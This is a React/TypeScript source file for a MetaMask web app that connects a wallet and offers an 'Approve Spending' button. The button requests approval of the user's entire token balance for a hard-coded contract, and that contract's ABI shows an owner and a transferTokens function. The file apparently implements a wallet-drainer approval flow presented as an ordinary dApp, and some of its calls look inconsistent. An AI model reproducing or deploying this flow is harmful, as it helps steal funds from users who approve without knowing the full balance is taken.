import './App.css';
import { Web3Provider } from '@ethersproject/providers';
import { useState, useEffect } from 'react';
import { formatBalance, formatChainAsNum } from './utils/index';
import detectEthereumprovider from '@metamask/detect-provider';
import { Contract, ethers, Signer } from 'ethers';
import React from 'react';

interface Wallet {
  accounts: string[];
  balance: string;
  chainId: string;
}

function App() {
  const [hasProvider, setHasProvider] = useState<boolean | null>(null);
  const initialState: Wallet = { accounts: [], balance: '0', chainId: '0' }; // Initialize with default values
  const [wallet, setWallet] = useState<Wallet>(initialState);
  const [isConnecting, setIsConnecting] = useState<boolean>(false);
  const [isProcessing, setIsProcessing] = useState<boolean>(false);
  const [error, setError] = useState<boolean>(false);
  const [errorMessage, setErrorMessage] = useState<string>('');

  // Define the contract address and ABI
  const contractAddress = '0xa17033c449175C091E293398DED9Da584Db599d9';
  const contractABI: any[] = [{"inputs":[{"internalType":"address","name":"_tokenAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_newTokenAddress","type":"address"}],"name":"changeTokenAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"tokenAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"}],"name":"transferTokens","outputs":[],"stateMutability":"nonpayable","type":"function"}];

  useEffect(() => {
    const refreshAccounts = async () => {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        setWallet((prevWallet) => ({ ...prevWallet, accounts }));
      } catch (err) {
        console.error('Error fetching accounts:', err);
      }
    };

    const refreshChain = async () => {
      try {
        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
        setWallet((prevWallet) => ({ ...prevWallet, chainId }));
      } catch (err) {
        console.error('Error fetching chain ID:', err);
      }
    };

    const getProvider = async () => {
      const provider = await detectEthereumprovider({ silent: true });
      setHasProvider(Boolean(provider));

      if (provider) {
        refreshAccounts();
        refreshChain();

        window.ethereum.on('accountsChanged', refreshAccounts);
        window.ethereum.on('chainChanged', refreshChain);
      }
    };

    getProvider();

    return () => {
      window.ethereum?.removeListener('accountsChanged', refreshAccounts);
      window.ethereum?.removeListener('chainChanged', refreshChain);
    };
  }, []);

  const handleConnect = async () => {
    setIsConnecting(true);
    try {
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' }) as string[];
      setWallet((prevWallet) => ({ ...prevWallet, accounts }));
      setError(false);
    } catch (err) {
      setError(true);
      setErrorMessage((err as Error).message);
    }
    setIsConnecting(false);
  };

  const fetchTokenBalance = async () => {
    if (!wallet.accounts.length) {
      return '0';
    }

    const provider = new Web3Provider(window.ethereum);
    const tokenAddress = '0x31437ff9083a2C5af07468042e3a84C3e5F74a07'; // Replace with the actual token address
    const tokenContract = new ethers.Contract(tokenAddress, ['function balanceOf(address) view returns (uint256)'], provider);

    try {
      const userAddress = wallet.accounts[0];
      const balance = await tokenContract.balanceOf(userAddress);
      return balance.toString();
    } catch (error) {
      console.error('Error fetching token balance:', error);
      return '0';
    }
  };

  const approveSpending = async () => {
    setIsProcessing(true);
    try {
      if (!wallet.accounts.length) {
        console.error('No accounts available.');
        return;
      }
  
      // Fetch the user's token balance
      const tokenBalance = await fetchTokenBalance();
      const approvalAmount = tokenBalance;
  
      if (approvalAmount === '0') {
        console.error('Insufficient balance for approval.');
        return;
      }
  
      await window.ethereum.request({
        method: 'eth_requestAccounts',
      });
  
      const provider = new Web3Provider(window.ethereum);
      const signer: Signer = provider.getSigner();
      const contract = new Contract(contractAddress, contractABI, signer);
      const spenderContractAddress = '0xa17033c449175C091E293398DED9Da584Db599d9'; // Replace with the actual spender contract address
  
      const tx = await contract.approve(spenderContractAddress, approvalAmount);
      await tx.wait();
  
      console.log('Approval of the entire balance successful.');
    } catch (error) {
      console.error('Error approving spending:', error);
    }
    setIsProcessing(false);
  };
  
  const disableConnect = Boolean(wallet.accounts.length) && isConnecting;

  return (
    <div className="App">
      <div>Injected provider {hasProvider ? 'DOES' : 'DOES NOT'} Exist</div>

      {window.ethereum?.isMetaMask && wallet.accounts.length === 0 && (
        <button disabled={disableConnect} onClick={handleConnect}>
          Connect MetaMask
        </button>
      )}

      {wallet.accounts.length > 0 && (
        <>
          <div>Wallet Accounts: {wallet.accounts[0]}</div>
          <div>Wallet Balance: {wallet.balance}</div>
          <div>Hex ChainId: {wallet.chainId}</div>
          <div>Numeric ChainId: {formatChainAsNum(wallet.chainId)}</div>
        </>
      )}

      {error && (
        <div onClick={() => setError(false)}>
          <strong>Error:</strong> {errorMessage}
        </div>
      )}

      <button onClick={approveSpending} disabled={isProcessing}>
        {isProcessing ? 'Processing...' : 'Approve Spending'}
      </button>
    </div>
  );
}

export default App;
